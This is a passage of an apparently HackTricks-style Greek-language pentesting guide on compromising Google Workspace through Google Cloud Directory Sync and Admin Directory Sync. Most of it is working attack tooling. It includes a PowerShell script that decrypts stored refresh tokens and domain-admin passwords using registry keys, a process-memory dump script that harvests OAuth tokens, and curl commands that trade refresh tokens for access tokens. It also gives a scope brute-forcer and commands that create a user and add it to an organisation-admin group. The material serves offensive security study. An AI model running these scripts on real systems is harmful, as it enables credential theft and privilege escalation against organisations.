https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Ορισμένα παραδείγματα χρησιμοποιώντας μερικούς από αυτούς τους τομείς:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** είναι ένα πρόσθετο για το Google Workspace που παρέχει εργαλεία για τη διατήρηση δεδομένων, αναζήτηση και εξαγωγή για τα δεδομένα της οργάνωσής σας που αποθηκεύονται σε υπηρεσίες του Google Workspace όπως το Gmail, το Drive, το Chat και άλλα.

* Ένα **Matter** στο Google Workspace Vault είναι ένα **δοχείο** που οργανώνει και ομαδοποιεί όλες τις πληροφορίες που σχετίζονται με μια συγκεκριμένη υπόθεση, έρευνα ή νομικό ζήτημα. Λειτουργεί ως το κεντρικό σημείο για τη διαχείριση των **Holds**, **Searches** και **Exports** που αφορούν αυτό το συγκεκριμένο θέμα.
* Ένα **Hold** στο Google Workspace Vault είναι μια **ενέργεια διατήρησης** που εφαρμόζεται σε συγκεκριμένους χρήστες ή ομάδες για να **αποτραπεί η διαγραφή ή η τροποποίηση** των δεδομένων τους εντός των υπηρεσιών του Google Workspace. Τα Holds διασφαλίζουν ότι οι σχετικές πληροφορίες παραμένουν ανέπαφες και αμετάβλητες για τη διάρκεια μιας νομικής υπόθεσης ή έρευνας.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
More [API endpoints in the docs](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

Αυτό είναι ένα εργαλείο που μπορεί να χρησιμοποιηθεί για να **συγχρονίσετε τους χρήστες και τις ομάδες του Active Directory σας με το Workspace σας** (και όχι το αντίστροφο κατά τη στιγμή της συγγραφής αυτού του κειμένου).

Είναι ενδιαφέρον γιατί είναι ένα εργαλείο που θα απαιτήσει τα **διαπιστευτήρια ενός superuser του Workspace και ενός προνομιούχου χρήστη AD**. Έτσι, μπορεί να είναι δυνατό να το βρείτε μέσα σε έναν διακομιστή τομέα που θα συγχρονίζει χρήστες από καιρό σε καιρό.

{% hint style="info" %}
Για να εκτελέσετε ένα **MitM** στο **`config-manager.exe`** δυαδικό αρχείο, απλώς προσθέστε την παρακάτω γραμμή στο αρχείο `config.manager.vmoptions`: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
Σημειώστε ότι [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) είναι ικανό να ανιχνεύσει το **GCDS**, να αποκτήσει πληροφορίες σχετικά με τη διαμόρφωση και **ακόμα και τους κωδικούς πρόσβασης και τα κρυπτογραφημένα διαπιστευτήρια**.
{% endhint %}

Επίσης, σημειώστε ότι το GCDS δεν θα συγχρονίσει τους κωδικούς πρόσβασης από το AD στο Workspace. Αν κάτι, θα δημιουργήσει απλώς τυχαίους κωδικούς πρόσβασης για τους νεοδημιουργηθέντες χρήστες στο Workspace όπως μπορείτε να δείτε στην παρακάτω εικόνα:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Δισκοι Tokens & Διαπιστευτήρια AD

Το δυαδικό αρχείο `config-manager.exe` (το κύριο δυαδικό αρχείο GCDS με GUI) θα αποθηκεύσει τα διαπιστευτήρια του Active Directory που έχουν ρυθμιστεί, το refresh token και την πρόσβαση από προεπιλογή σε ένα **xml αρχείο** στον φάκελο **`C:\Program Files\Google Cloud Directory Sync`** σε ένα αρχείο που ονομάζεται **`Untitled-1.xml`** από προεπιλογή. Αν και θα μπορούσε επίσης να αποθηκευτεί στα `Documents` του χρήστη ή σε **οποιονδήποτε άλλο φάκελο**.

Επιπλέον, το μητρώο **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** μέσα στο κλειδί **`open.recent`** περιέχει τις διαδρομές προς όλα τα πρόσφατα ανοιγμένα αρχεία διαμόρφωσης (xmls). Έτσι είναι δυνατό να **το ελέγξετε για να τα βρείτε**.

Οι πιο ενδιαφέρουσες πληροφορίες μέσα στο αρχείο θα είναι:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
Σημειώστε πώς το **refresh** **token** και ο **κωδικός πρόσβασης** του χρήστη είναι **κρυπτογραφημένα** χρησιμοποιώντας **AES CBC** με ένα τυχαία παραγόμενο κλειδί και IV που αποθηκεύονται στο **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** (όπου η βιβλιοθήκη **`prefs`** της Java αποθηκεύει τις προτιμήσεις) στα κλειδιά συμβολοσειράς **`/Encryption/Policy/V2.iv`** και **`/Encryption/Policy/V2.key`** που αποθηκεύονται σε base64.

<details>

<summary>Powershell script για την αποκρυπτογράφηση του refresh token και του κωδικού πρόσβασης</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
Σημειώστε ότι είναι δυνατόν να ελέγξετε αυτές τις πληροφορίες ελέγχοντας τον κώδικα java του **`DirSync.jar`** από **`C:\Program Files\Google Cloud Directory Sync`** αναζητώντας τη συμβολοσειρά `exportkeys` (καθώς είναι η παράμετρος cli που περιμένει το δυαδικό `upgrade-config.exe` για να εξάγει τα κλειδιά).
{% endhint %}

Αντί να χρησιμοποιήσετε το σενάριο powershell, είναι επίσης δυνατό να χρησιμοποιήσετε το δυαδικό **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** με την παράμετρο `-exportKeys` και να αποκτήσετε το **Key** και **IV** από το μητρώο σε hex και στη συνέχεια να χρησιμοποιήσετε κάποιο cyberchef με AES/CBC και αυτό το κλειδί και IV για να αποκρυπτογραφήσετε τις πληροφορίες.

### GCDS - Εξαγωγή tokens από τη μνήμη

Ακριβώς όπως με το GCPW, είναι δυνατό να εξάγετε τη μνήμη της διαδικασίας του `config-manager.exe` (είναι το όνομα του κύριου δυαδικού GCDS με GUI) και θα μπορείτε να βρείτε tokens ανανέωσης και πρόσβασης (αν έχουν ήδη παραχθεί).\
Υποθέτω ότι θα μπορούσατε επίσης να βρείτε τις ρυθμισμένες διαπιστεύσεις AD.

<details>

<summary>Εξαγωγή διαδικασιών config-manager.exe και αναζήτηση tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - Δημιουργία διαπιστευτηρίων πρόσβασης από ανανεωτικά διαπιστευτήρια

Χρησιμοποιώντας το ανανεωτικό διαπιστευτήριο, είναι δυνατή η δημιουργία διαπιστευτηρίων πρόσβασης χρησιμοποιώντας το και το αναγνωριστικό πελάτη και το μυστικό πελάτη που καθορίζονται στην παρακάτω εντολή:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
Σημειώστε ότι ακόμη και αν έχετε ένα refresh token, δεν είναι δυνατόν να ζητήσετε οποιοδήποτε scope για το access token, καθώς μπορείτε να ζητήσετε μόνο τα **scopes που υποστηρίζονται από την εφαρμογή όπου δημιουργείτε το access token**.

Επίσης, το refresh token δεν είναι έγκυρο σε κάθε εφαρμογή.
{% endhint %}

Από προεπιλογή, το GCSD δεν θα έχει πρόσβαση ως χρήστης σε κάθε πιθανό OAuth scope, οπότε χρησιμοποιώντας το παρακάτω σενάριο μπορούμε να βρούμε τα scopes που μπορούν να χρησιμοποιηθούν με το `refresh_token` για να δημιουργήσουμε ένα `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Και αυτό είναι το αποτέλεσμα που πήρα τη στιγμή που έγραφα:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### Δημιουργήστε έναν χρήστη και προσθέστε τον στην ομάδα `gcp-organization-admins` για να προσπαθήσετε να κλιμακώσετε στην GCP
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
Δεν είναι δυνατόν να δώσετε στο νέο χρήστη τον ρόλο του Super Admin επειδή το **refresh token δεν έχει αρκετά scopes** για να δώσει τα απαιτούμενα δικαιώματα.
{% endhint %}

## Admin Directory Sync

Η κύρια διαφορά μεταξύ αυτού του τρόπου συγχρονισμού χρηστών με το GCDS είναι ότι το GCDS γίνεται χειροκίνητα με κάποια binaries που πρέπει να κατεβάσετε και να εκτελέσετε, ενώ το **Admin Directory Sync είναι serverless** και διαχειρίζεται από την Google στο [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

Αυτή τη στιγμή που γράφεται αυτό το κείμενο, αυτή η υπηρεσία είναι σε beta και υποστηρίζει 2 τύπους συγχρονισμού: Από **Active Directory** και από **Azure Entra ID:**

* **Active Directory:** Για να το ρυθμίσετε αυτό, πρέπει να δώσετε **πρόσβαση στην Google στο περιβάλλον Active Directory σας**. Και καθώς η Google έχει πρόσβαση μόνο σε δίκτυα GCP (μέσω **VPC connectors**), πρέπει να δημιουργήσετε έναν connector και στη συνέχεια να κάνετε το AD σας διαθέσιμο από αυτόν τον connector, έχοντας το σε VMs στο δίκτυο GCP ή χρησιμοποιώντας Cloud VPN ή Cloud Interconnect. Στη συνέχεια, πρέπει επίσης να παρέχετε **credentials** ενός λογαριασμού με δικαιώματα ανάγνωσης στο directory και **πιστοποιητικό** για επικοινωνία μέσω **LDAPS**.
* **Azure Entra ID:** Για να το ρυθμίσετε, χρειάζεται απλώς να **συνδεθείτε στο Azure με έναν χρήστη με δικαιώματα ανάγνωσης** πάνω στη συνδρομή Entra ID σε ένα pop-up που εμφανίζεται από την Google, και η Google θα κρατήσει το token με δικαιώματα ανάγνωσης πάνω στο Entra ID.

Μόλις ρυθμιστεί σωστά, και οι δύο επιλογές θα επιτρέψουν να **συγχρονίσετε χρήστες και ομάδες με το Workspace**, αλλά δεν θα επιτρέψουν να ρυθμίσετε χρήστες και ομάδες από το Workspace στο AD ή EntraID.

Άλλες επιλογές που θα επιτρέψει κατά τη διάρκεια αυτού του συγχρονισμού είναι:

* Αποστολή email στους νέους χρήστες για να συνδεθούν
* Αυτόματη αλλαγή της διεύθυνσης email τους σε αυτή που χρησιμοποιείται από το Workspace. Έτσι, αν το Workspace χρησιμοποιεί `@hacktricks.xyz` και οι χρήστες EntraID χρησιμοποιούν `@carloshacktricks.onmicrosoft.com`, το `@hacktricks.xyz` θα χρησιμοποιηθεί για τους χρήστες που δημιουργούνται στον λογαριασμό.
* Επιλογή των **ομάδων που περιέχουν τους χρήστες** που θα συγχρονιστούν.
* Επιλογή **ομάδων** για συγχρονισμό και δημιουργία στο Workspace (ή ένδειξη για συγχρονισμό όλων των ομάδων).

### Από AD/EntraID -> Google Workspace (& GCP)

Αν καταφέρετε να συμβιβάσετε ένα AD ή EntraID, θα έχετε πλήρη έλεγχο των χρηστών και των ομάδων που θα συγχρονιστούν με το Google Workspace.\
Ωστόσο, σημειώστε ότι οι **κωδικοί πρόσβασης** που μπορεί να χρησιμοποιούν οι χρήστες στο Workspace **μπορεί να είναι οι ίδιοι ή όχι**.

#### Επίθεση σε χρήστες

Όταν συμβαίνει ο συγχρονισμός, μπορεί να συγχρονίσει **όλους τους χρήστες από το AD ή μόνο αυτούς από μια συγκεκριμένη OU** ή μόνο τους **χρήστες μέλη συγκεκριμένων ομάδων στο EntraID**. Αυτό σημαίνει ότι για να επιτεθείτε σε έναν συγχρονισμένο χρήστη (ή να δημιουργήσετε έναν νέο που θα συγχρονιστεί), θα χρειαστεί πρώτα να καταλάβετε ποιους χρήστες συγχρονίζετε.

* Οι χρήστες μπορεί να **ξαναχρησιμοποιούν τον κωδικό πρόσβασης ή όχι από το AD ή EntraID**, αλλά αυτό σημαίνει ότι θα χρειαστεί να **συμβιβάσετε τους κωδικούς πρόσβασης των χρηστών για να συνδεθείτε**.
* Αν έχετε πρόσβαση στα **emails** των χρηστών, θα μπορούσατε να **αλλάξετε τον κωδικό πρόσβασης του Workspace ενός υπάρχοντος χρήστη**, ή **να δημιουργήσετε έναν νέο χρήστη**, να περιμένετε μέχρι να συγχρονιστεί και να ρυθμίσετε τον λογαριασμό.

Μόλις αποκτήσετε πρόσβαση στον χρήστη μέσα στο Workspace, μπορεί να του έχουν δοθεί κάποιες **άδειες από προεπιλογή**.

#### Επίθεση σε Ομάδες

Πρέπει επίσης να καταλάβετε πρώτα ποιες ομάδες συγχρονίζονται. Αν και υπάρχει η πιθανότητα ότι **ΟΛΕΣ** οι ομάδες συγχρονίζονται (καθώς το Workspace το επιτρέπει).

{% hint style="info" %}
Σημειώστε ότι ακόμη και αν οι ομάδες και οι συμμετοχές εισάγονται στο Workspace, οι **χρήστες που δεν συγχρονίζονται στη συγχρονισμό χρηστών δεν θα δημιουργηθούν** κατά τη διάρκεια του συγχρονισμού ομάδων, ακόμη και αν είναι μέλη οποιασδήποτε από τις ομάδες που συγχρονίζονται.
{% endhint %}

